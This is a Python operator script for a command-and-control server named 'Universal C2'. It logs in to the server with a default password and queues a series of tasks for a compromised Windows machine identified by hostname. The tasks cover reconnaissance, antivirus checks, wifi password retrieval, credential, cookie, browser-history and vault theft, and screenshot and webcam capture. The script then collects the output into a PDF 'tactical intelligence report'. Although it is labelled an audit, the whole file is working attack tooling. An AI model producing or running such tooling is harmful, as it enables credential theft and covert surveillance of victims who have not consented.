import requests
import time
import json
import os
from fpdf import FPDF

BASE_URL = "http://127.0.0.1:5001"
AGENT_ID = "LAPTOP-33MRE1H7_73789895"
REPORT_NAME = f"ULTIMATE_Audit_Report_Windows_{int(time.time())}.pdf"

def log(msg):
    print(f"[*] {msg}")

class PDF(FPDF):
    def header(self):
        self.set_font('Helvetica', 'B', 15)
        self.cell(0, 10, 'UNIVERSAL C2 - TACTICAL INTELLIGENCE REPORT', 0, 1, 'C')
        self.ln(5)

    def footer(self):
        self.set_y(-15)
        self.set_font('Helvetica', 'I', 8)
        self.cell(0, 10, f'Page {self.page_no()}', 0, 0, 'C')

def generate_pdf(results_map):
    pdf = PDF()
    pdf.set_auto_page_break(auto=True, margin=15)
    pdf.add_page()
    
    # Metadata
    pdf.set_font("Helvetica", "B", 12)
    pdf.cell(0, 10, f"Target Hostname: LAPTOP-33MRE1H7", ln=True)
    pdf.cell(0, 10, f"Agent ID: {AGENT_ID}", ln=True)
    pdf.cell(0, 10, f"Execution Date: {time.ctime()}", ln=True)
    pdf.ln(10)
    
    for cmd, output in results_map.items():
        pdf.set_font("Helvetica", "B", 14)
        pdf.set_text_color(0, 51, 102)
        pdf.cell(0, 10, f"OPERATION: {cmd}", ln=True)
        pdf.set_text_color(0, 0, 0)
        pdf.set_font("Courier", "", 8)
        
        # Clean output for PDF (replace non-latin characters and ensure wrapping)
        try:
            clean_out = output.encode('latin-1', 'replace').decode('latin-1')
        except:
            clean_out = "[!] Output contains binary or incompatible encoding."
            
        pdf.multi_cell(0, 4, clean_out, border=0)
        pdf.ln(5)
        pdf.line(10, pdf.get_y(), 200, pdf.get_y())
        pdf.ln(5)
        
    pdf.output(REPORT_NAME)
    return REPORT_NAME

def run_comprehensive_audit():
    s = requests.Session()
    s.post(f"{BASE_URL}/login", data={"password": "admin"})

    # Force re-checkin and sync
    log("Synchronizing with agent...")
    s.post(f"{BASE_URL}/admin/task", json={"agent_id": AGENT_ID, "command": "@version"})
    time.sleep(5)
    
    # Comprehensive Operation List
    ops = [
        "@version",
        "@recon",
        "@systeminfo",
        "@privcheck",
        "@avcheck",
        "@arp_scan",
        "netstat -ano",
        "@wifi",
        "@netshare",
        "@processes",
        "@installed",
        "@creds",
        "@cookies",
        "@history",
        "@vault",
        "@screenshot",
        "@webcam"
    ]
    
    results_map = {}
    
    for op in ops:
        log(f"Initiating: {op}")
        resp = s.post(f"{BASE_URL}/admin/task", json={"agent_id": AGENT_ID, "command": op})
        if resp.status_code != 200:
            results_map[op] = f"[!] Task Submission Failed: {resp.text}"
            continue
            
        task_id = resp.json().get("task_id")
        
        # Wait for completion (extended timeout for heavy tasks like @creds)
        found = False
        timeout = 60 if "@" in op else 30
        if op in ["@creds", "@cookies", "@history", "@vault"]: timeout = 120
        
        start_time = time.time()
        while time.time() - start_time < timeout:
            time.sleep(3)
            res_data = s.get(f"{BASE_URL}/admin/results", params={"agent_id": AGENT_ID}).json()
            for r in reversed(res_data):
                if r.get("task_id") == task_id:
                    results_map[op] = r.get("output")
                    found = True
                    break
            if found: break
            
        if not found:
            results_map[op] = "[!] Operation timed out or failed to return output."
            log(f"  [!] Timeout for {op}")
        else:
            log(f"  [+] Received output for {op}")
            
    # Generate Report
    log("Compiling ULTIMATE PDF Report...")
    path = generate_pdf(results_map)
    log(f"SUCCESS: Comprehensive report generated at {path}")
    print(f"\n[REPORT_PATH] {os.path.abspath(path)}")

if __name__ == "__main__":
    run_comprehensive_audit()
